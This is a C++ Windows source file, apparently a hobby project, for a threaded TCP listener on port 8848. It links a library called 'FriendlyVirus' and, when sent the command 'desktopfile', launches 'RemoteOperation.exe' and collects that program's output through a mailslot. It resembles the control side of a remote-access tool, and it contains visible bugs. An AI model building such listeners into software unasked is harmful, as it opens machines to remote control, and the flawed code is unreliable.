#include "pch.h"
#include <iostream>
#include<WinSock2.h>
#include<Windows.h>
#include<WS2tcpip.h>
#include"../FriendlyVirus/FriendlyVirus.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"../debug/FriendlyVirus.lib")

void GetTotalBytes(WCHAR** des,int *totalBytes) {
	*totalBytes = 0;
	WCHAR** copyDes = des;
	while (*copyDes) {
		*totalBytes += lstrlen(*copyDes) * sizeof(WCHAR);
		copyDes++;
	}
}

VOID JudgeSuccessOrNot(bool result) {
	if (result) {
		printf("指令执行成功!\n");
	}
	else {
		printf("指令执行失败，error:%d\n", GetLastError());
	}
};
//创建邮槽，便于进程间的通信
HANDLE* CreateMyMailslot() {
	HANDLE* hMailslot=(HANDLE*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(hMailslot));
	*hMailslot = CreateMailslot(L"\\\\.\\mailslot\\lzq",//邮槽名称可能要改动，多线程时可能创建相同的
		1000, 0, NULL);
	if (hMailslot==INVALID_HANDLE_VALUE) {
		printf("创建邮槽失败!error:%d\n", GetLastError());
		return NULL;
	}
	else {
		printf("创建邮槽成功!\n");
		return hMailslot;
	}
}

DWORD WINAPI ThreadProc(LPVOID lpParam) {
	SOCKET answerSocket = (SOCKET)lpParam;
	CHAR recvBuff[512];
	int bytesRecv = 0;
	int threadId = GetCurrentThreadId();
	HANDLE* hMailslot=NULL;
	printf("线程[%d]已启动!\n", threadId);
	//创建邮槽便于本程序与其创建的进程间的数据交换
	hMailslot = CreateMyMailslot();
	while (true)
	{
		printf("线程[%d]等待数据传入......\n",threadId);
		Sleep(2000);
		ZeroMemory(recvBuff, 512);
		bytesRecv = recv(answerSocket, recvBuff, 512, 0);
		if (bytesRecv == SOCKET_ERROR) {
			closesocket(answerSocket);
			break;
		}
		else {
			if (strcmp(recvBuff, "\\c") == 0 || strcmp(recvBuff, "\\close") == 0) {
				printf("线程[%d]已结束\n",threadId);
				closesocket(answerSocket);
				break;
			}
			printf("线程[%d]接收到数据:%s\n",threadId,recvBuff);
			if (strcmp(recvBuff, "desktopfile") == 0) {
				WCHAR exeName[] = L"RemoteOperation.exe";
				BOOL bCreateProcessResult = 0;
				STARTUPINFO strtinfo;
				PROCESS_INFORMATION processInformation;
				WCHAR* totalMessage = NULL;
				WCHAR* totalMessageTmp = NULL;
				ZeroMemory(&strtinfo, sizeof(strtinfo));
				ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
				bCreateProcessResult = CreateProcess(NULL,exeName, NULL, NULL, FALSE, 0, 
					NULL, NULL, &strtinfo,&processInformation);
				JudgeSuccessOrNot(bCreateProcessResult);
				LPWSTR* message = GetMessageFromMailslot(*hMailslot);
				LPWSTR* messageTmp = message;
				while (*messageTmp) {
					printf("%ws\n", *messageTmp);
					message++;
			}
				/*if (*messageTmp) {
					int totalBytes = 0;
					GetTotalBytes(messageTmp, &totalBytes);
					if (totalBytes != 0) {
						totalMessage = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalBytes);
						totalMessageTmp = totalMessage;
					}
					while (*messageTmp) {
						while (**message) {
							CopyMemory((void*)*totalMessage, (void*)**messageTmp, sizeof(WCHAR));
							totalMessageTmp++;
							**messageTmp++;
						}
						messageTmp++;
					}
				}
				printf("%ws\n",totalMessage);
				FreePointers(message);
				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, totalMessage);*/
				CloseHandle(processInformation.hThread);
				CloseHandle(processInformation.hProcess);
			}
		}
	}
	return 0;
}

int main()
{
	ADDRINFO addInfo;
	ADDRINFO *result=nullptr;
	SOCKET answerSocket;
	WSADATA wSaData;
	int nStartRet = 0;
	int nGetAddrRet = 0; 
	int nBindRet = 0;
	int nListenRet = 0;
	SOCKET listenSocket;
	nStartRet = WSAStartup(MAKEWORD(2, 2), &wSaData);
	if (nStartRet != 0) {
		printf("WSAStartup（）failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	ZeroMemory(&addInfo, sizeof(addInfo));
	addInfo.ai_family = AF_INET;
	addInfo.ai_socktype = SOCK_STREAM;
	addInfo.ai_protocol = IPPROTO_TCP;
	addInfo.ai_flags = AI_PASSIVE;
	nGetAddrRet = getaddrinfo(NULL, "8848", &addInfo, &result);
	if (nGetAddrRet!=0)
	{
		printf("getaddrinfo() failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		printf("socket() failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	nBindRet = bind(listenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (nBindRet != 0) {
		printf("bind() failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	printf("正在监听....\n");
	nListenRet = listen(listenSocket, 10);
	if (nListenRet != 0) {
		printf("监听失败!error:%d\n", WSAGetLastError());
		return -1;
	}
	while (true)
	{
		answerSocket = accept(listenSocket,NULL,NULL);
		if (answerSocket==INVALID_SOCKET)
		{
			break;
		}
		CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
			(void*)answerSocket, 0, nullptr);
		
	}
}